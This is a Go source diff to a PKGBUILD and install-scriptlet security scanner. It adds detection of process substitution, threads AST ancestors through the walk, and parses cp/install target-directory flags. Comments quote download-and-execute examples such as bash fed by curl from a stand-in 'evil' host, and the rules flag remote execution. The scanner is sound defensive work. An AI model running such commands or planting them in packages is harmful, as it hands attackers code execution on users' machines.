@@ -44,7 +44,7 @@ var discordCDNs = map[string]struct{}{
 }
 
 // CheckUntrustedSources inspects extracted source URLs in source=() for security risks.
-func CheckUntrustedSources(analysis *PKGBUILDAnalysis, cfg *config.Config) []ThreatTrigger {
+func CheckUntrustedSources(analysis *Analysis, cfg *config.Config) []ThreatTrigger {
 	var triggers []ThreatTrigger
 	if len(analysis.Source) == 0 {
 		return triggers
@@ -190,8 +190,7 @@ func isHostMatch(host string, hosts map[string]struct{}) bool {
 }
 
 // AnalyzeAST scans the AST of a PKGBUILD or install scriptlet for threat triggers.
-func AnalyzeAST(analysis *PKGBUILDAnalysis, cfg *config.Config) ([]ThreatTrigger, []string) {
-	var triggers []ThreatTrigger
+func AnalyzeAST(analysis *Analysis, cfg *config.Config) ([]ThreatTrigger, []string) {
 	var dampeners []string
 	dampenerSet := make(map[string]struct{})
 
@@ -204,17 +203,20 @@ func AnalyzeAST(analysis *PKGBUILDAnalysis, cfg *config.Config) ([]ThreatTrigger
 
 	// 1. Check sources
 	sourceTriggers := CheckUntrustedSources(analysis, cfg)
-	triggers = append(triggers, sourceTriggers...)
 
 	// 2. Check checksum dampeners / integrity
 	integrityTriggers, integrityDampeners := EvaluateIntegrity(analysis, cfg)
+
+	triggers := make([]ThreatTrigger, 0, len(sourceTriggers)+len(integrityTriggers))
+	triggers = append(triggers, sourceTriggers...)
 	triggers = append(triggers, integrityTriggers...)
 	for _, d := range integrityDampeners {
 		addDampener(d)
 	}
 
-	// 3. AST Traversal
-	WalkScope(analysis.File, analysis.IsInstallScript, func(node syntax.Node, scope string) bool {
+	// 3. AST Traversal. The ancestor chain is threaded through so command/process
+	// substitution checks do not have to re-walk the whole AST per occurrence.
+	WalkScopeAncestors(analysis.File, analysis.IsInstallScript, func(node syntax.Node, scope string, ancestors []syntax.Node) bool {
 		if node == nil {
 			return false
 		}
@@ -225,7 +227,9 @@ func AnalyzeAST(analysis *PKGBUILDAnalysis, cfg *config.Config) ([]ThreatTrigger
 		case *syntax.BinaryCmd:
 			checkBinaryCmd(n, scope, &triggers)
 		case *syntax.CmdSubst:
-			checkCmdSubst(n, analysis.File, scope, &triggers)
+			checkCmdSubst(n, ancestors, scope, &triggers)
+		case *syntax.ProcSubst:
+			checkProcSubst(n, ancestors, scope, &triggers)
 		case *syntax.Stmt:
 			checkStmtRedirs(n, scope, &triggers, addDampener)
 		}
@@ -344,7 +348,14 @@ func checkCallExpr(call *syntax.CallExpr, scope string, triggers *[]ThreatTrigge
 func checkTamperingCommand(cmdName string, args []*syntax.Word, line int, scope string, triggers *[]ThreatTrigger, addDampener func(string)) {
 	switch cmdName {
 	case "cp", "mv", "install", "rm", "tee":
-		for _, arg := range args[1:] {
+		// `cp -t DIR src` / `--target-directory=DIR` name the destination via a
+		// flag, so the positional arguments are all sources. Check the flag value
+		// as the target instead of mistaking a source for the destination.
+		targetDir, rest := splitTargetDirectory(args[1:])
+		if targetDir != "" {
+			checkPathTarget(nil, targetDir, line, scope, triggers, addDampener)
+		}
+		for _, arg := range rest {
 			val := WordToString(arg)
 			if strings.HasPrefix(val, "-") {
 				continue
@@ -355,7 +366,7 @@ func checkTamperingCommand(cmdName string, args []*syntax.Word, line int, scope 
 		hasInPlace := false
 		for _, arg := range args[1:] {
 			val := WordToString(arg)
-			if strings.HasPrefix(val, "-i") || val == "--in-place" {
+			if strings.HasPrefix(val, "-i") || strings.HasPrefix(val, "--in-place") {
 				hasInPlace = true
 				break
 			}
@@ -388,6 +399,31 @@ func checkTamperingCommand(cmdName string, args []*syntax.Word, line int, scope 
 			}
 		}
 	}
+}
+
+// splitTargetDirectory extracts the value of `-t DIR`, `-tDIR`,
+// `--target-directory DIR` or `--target-directory=DIR` from a command's
+// arguments, returning the directory (empty when absent) and the arguments with
+// any consumed flag/value removed.
+func splitTargetDirectory(args []*syntax.Word) (string, []*syntax.Word) {
+	rest := make([]*syntax.Word, 0, len(args))
+	for i := 0; i < len(args); i++ {
+		val := WordToString(args[i])
+		switch {
+		case val == "-t" || val == "--target-directory":
+			if i+1 < len(args) {
+				i++
+				return WordToString(args[i]), append(rest, args[i+1:]...)
+			}
+		case strings.HasPrefix(val, "--target-directory="):
+			return strings.TrimPrefix(val, "--target-directory="), append(rest, args[i+1:]...)
+		case strings.HasPrefix(val, "-t") && len(val) > 2:
+			return val[2:], append(rest, args[i+1:]...)
+		default:
+			rest = append(rest, args[i])
+		}
+	}
+	return "", rest
 }
 
 func checkStmtRedirs(stmt *syntax.Stmt, scope string, triggers *[]ThreatTrigger, addDampener func(string)) {
@@ -550,35 +586,44 @@ func checkBinaryCmd(binCmd *syntax.BinaryCmd, scope string, triggers *[]ThreatTr
 			Scope:       scope,
 		})
 
-		switch scope {
-		case ScopeRoot:
-			*triggers = append(*triggers, ThreatTrigger{
-				Category:    CategoryRemoteExecution,
-				Name:        "root_scope_network_execution",
-				Description: "Network download and execution during PKGBUILD root-scope sourcing",
-				ScoreWeight: 45,
-				Line:        line,
-				Scope:       scope,
-			})
-		case ScopeFunction:
-			*triggers = append(*triggers, ThreatTrigger{
-				Category:    CategoryRemoteExecution,
-				Name:        "function_network_execution",
-				Description: "Network download and execution inside function scope",
-				ScoreWeight: 40,
-				Line:        line,
-				Scope:       scope,
-			})
-		case ScopeInstallScriptlet:
-			*triggers = append(*triggers, ThreatTrigger{
-				Category:    CategoryRemoteExecution,
-				Name:        "install_scriptlet_network_execution",
-				Description: "Network download and execution inside install scriptlet",
-				ScoreWeight: 45,
-				Line:        line,
-				Scope:       scope,
-			})
-		}
+		appendScopeNetworkExecution(scope, line, triggers)
+	}
+}
+
+// appendScopeNetworkExecution adds the scope-escalation trigger shared by every
+// "network download executed as code" detection (pipe-to-shell, command
+// substitution, and process substitution). Downloading and executing remote
+// content during root-scope sourcing or an install scriptlet is the highest
+// risk; inside a build function it is still a full remote-execution path.
+func appendScopeNetworkExecution(scope string, line int, triggers *[]ThreatTrigger) {
+	switch scope {
+	case ScopeRoot:
+		*triggers = append(*triggers, ThreatTrigger{
+			Category:    CategoryRemoteExecution,
+			Name:        "root_scope_network_execution",
+			Description: "Network download and execution during PKGBUILD root-scope sourcing",
+			ScoreWeight: 45,
+			Line:        line,
+			Scope:       scope,
+		})
+	case ScopeFunction:
+		*triggers = append(*triggers, ThreatTrigger{
+			Category:    CategoryRemoteExecution,
+			Name:        "function_network_execution",
+			Description: "Network download and execution inside function scope",
+			ScoreWeight: 40,
+			Line:        line,
+			Scope:       scope,
+		})
+	case ScopeInstallScriptlet:
+		*triggers = append(*triggers, ThreatTrigger{
+			Category:    CategoryRemoteExecution,
+			Name:        "install_scriptlet_network_execution",
+			Description: "Network download and execution inside install scriptlet",
+			ScoreWeight: 45,
+			Line:        line,
+			Scope:       scope,
+		})
 	}
 }
 
@@ -610,8 +655,8 @@ func collectPipelineStages(node syntax.Node) []*syntax.CallExpr {
 	return stages
 }
 
-func checkCmdSubst(subst *syntax.CmdSubst, file *syntax.File, scope string, triggers *[]ThreatTrigger) {
-	if !cmdSubstOutputExecuted(file, subst) {
+func checkCmdSubst(subst *syntax.CmdSubst, ancestors []syntax.Node, scope string, triggers *[]ThreatTrigger) {
+	if !cmdSubstOutputExecuted(ancestors) {
 		return
 	}
 	line := int(subst.Pos().Line())
@@ -640,31 +685,73 @@ func checkCmdSubst(subst *syntax.CmdSubst, file *syntax.File, scope string, trig
 			Line:        line,
 			Scope:       scope,
 		})
+		appendScopeNetworkExecution(scope, line, triggers)
 	}
 }
 
-func nodeAncestors(file *syntax.File, target syntax.Node) []syntax.Node {
-	var stack []syntax.Node
-	var ancestors []syntax.Node
-	syntax.Walk(file, func(node syntax.Node) bool {
+// checkProcSubst flags Bash process substitution that feeds a network download
+// into an interpreter, e.g. `bash <(curl -s https://evil/x.sh)`. This is a
+// distinct evasion from command substitution: the download's output is exposed
+// as a /dev/fd path argument rather than captured stdout, so the cmdsubst rules
+// never see it.
+func checkProcSubst(ps *syntax.ProcSubst, ancestors []syntax.Node, scope string, triggers *[]ThreatTrigger) {
+	if ps == nil || ps.Op != syntax.CmdIn {
+		return
+	}
+
+	// Only a security concern when the substitution output (a /dev/fd path) is
+	// handed to an interpreter that executes it. Benign uses such as
+	// `sha256sum <(curl ...)` read the path as a file argument and are ignored.
+	if !procSubstOutputExecuted(ancestors) {
+		return
+	}
+
+	foundNet := false
+	syntax.Walk(ps, func(node syntax.Node) bool {
 		if node == nil {
-			if len(stack) > 0 {
-				stack = stack[:len(stack)-1]
+			return false
+		}
+		if call, ok := node.(*syntax.CallExpr); ok {
+			cmd, _ := getCallCommand(call)
+			if isNetworkTool(cmd) {
+				foundNet = true
+				return false
 			}
-			return false
 		}
-		if node == target {
-			ancestors = append(ancestors, stack...)
-			return false
-		}
-		stack = append(stack, node)
 		return true
 	})
-	return ancestors
+
+	if foundNet {
+		*triggers = append(*triggers, ThreatTrigger{
+			Category:    CategoryRemoteExecution,
+			Name:        "procsubst_network_execution",
+			Description: "Process substitution feeding network download into interpreter",
+			ScoreWeight: 45,
+			Line:        int(ps.Pos().Line()),
+			Scope:       scope,
+		})
+		appendScopeNetworkExecution(scope, int(ps.Pos().Line()), triggers)
+	}
 }
 
-func cmdSubstOutputExecuted(file *syntax.File, target *syntax.CmdSubst) bool {
-	ancestors := nodeAncestors(file, target)
+// procSubstOutputExecuted reports whether the process substitution's output is
+// passed to a shell interpreter, `source`, or `eval` as an argument.
+func procSubstOutputExecuted(ancestors []syntax.Node) bool {
+	var call *syntax.CallExpr
+	for i := len(ancestors) - 1; i >= 0; i-- {
+		if c, ok := ancestors[i].(*syntax.CallExpr); ok {
+			call = c
+			break
+		}
+	}
+	if call == nil {
+		return false
+	}
+	cmd, _ := getCallCommand(call)
+	return isShell(cmd) || cmd == "source" || cmd == "." || cmd == "eval"
+}
+
+func cmdSubstOutputExecuted(ancestors []syntax.Node) bool {
 	var word *syntax.Word
 	var call *syntax.CallExpr
 	var stmt *syntax.Stmt
@@ -689,6 +776,13 @@ func cmdSubstOutputExecuted(file *syntax.File, target *syntax.CmdSubst) bool {
 	}
 	cmd, _ := getCallCommand(call)
 	if cmd == "eval" || call.Args[0] == word {
+		return true
+	}
+	// Interpreter invoked with the download as an argument, e.g.
+	// `bash -c "$(curl ...)"`, `sh "$(curl ...)"`, or `source "$(curl ...)"`.
+	// The remote content is executed by the interpreter rather than merely
+	// captured, which the args[0] check above does not catch.
+	if isShell(cmd) || cmd == "source" || cmd == "." {
 		return true
 	}
 	if stmt == nil {
